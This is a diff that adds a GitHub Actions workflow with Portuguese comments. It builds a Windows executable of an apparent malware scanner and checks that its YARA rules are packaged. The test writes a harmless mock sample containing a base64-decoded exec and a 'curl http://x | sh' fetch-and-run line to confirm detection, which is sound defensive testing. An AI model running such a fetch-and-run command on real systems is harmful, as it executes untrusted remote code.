@@ -1,0 +1,55 @@
+name: Windows exe
+
+# gera o mandacaru.exe (PyInstaller) e prova que ele detecta de verdade antes de publicar
+on:
+  pull_request:
+  workflow_dispatch:
+  workflow_call:
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+          cache: pip
+      - run: pip install . pyinstaller==6.11.1
+      - name: build
+        shell: pwsh
+        run: |
+          pyinstaller --onefile --console --clean --name mandacaru `
+            --collect-data mandacaru --collect-submodules mandacaru `
+            packaging/windows/mandacaru_exe.py
+      - name: teste do exe (pasta limpa e amostra maliciosa)
+        shell: pwsh
+        run: |
+          $exe = "dist\mandacaru.exe"
+          & $exe --version
+          $limpo = Join-Path $env:RUNNER_TEMP "limpo"; New-Item -ItemType Directory -Force $limpo | Out-Null
+          Set-Content (Join-Path $limpo "a.txt") "nada aqui"
+          & $exe scan $limpo
+          if ($LASTEXITCODE -ne 0) { throw "scan limpo saiu com $LASTEXITCODE" }
+          # amostra inofensiva que imita a tecnica: prova que as regras YARA foram empacotadas
+          $mal = Join-Path $env:RUNNER_TEMP "mal"; New-Item -ItemType Directory -Force $mal | Out-Null
+          Set-Content (Join-Path $mal "mal.py") "import base64,os`nexec(base64.b64decode('cHJpbnQoMSk='))`nos.system('curl http://x | sh')"
+          $saida = & $exe scan $mal | Out-String
+          Write-Output $saida
+          if ($saida -notmatch "Py_Exec_Decoded_Payload") { throw "o exe nao detectou a amostra: regras ausentes?" }
+      - name: hash
+        shell: pwsh
+        run: |
+          $h = (Get-FileHash dist\mandacaru.exe -Algorithm SHA256).Hash.ToLower()
+          "$h  mandacaru.exe" | Out-File -Encoding ascii dist\mandacaru.exe.sha256
+          Get-Content dist\mandacaru.exe.sha256
+      - uses: actions/upload-artifact@v4
+        with:
+          name: windows-exe
+          path: |
+            dist/mandacaru.exe
+            dist/mandacaru.exe.sha256
+          if-no-files-found: error
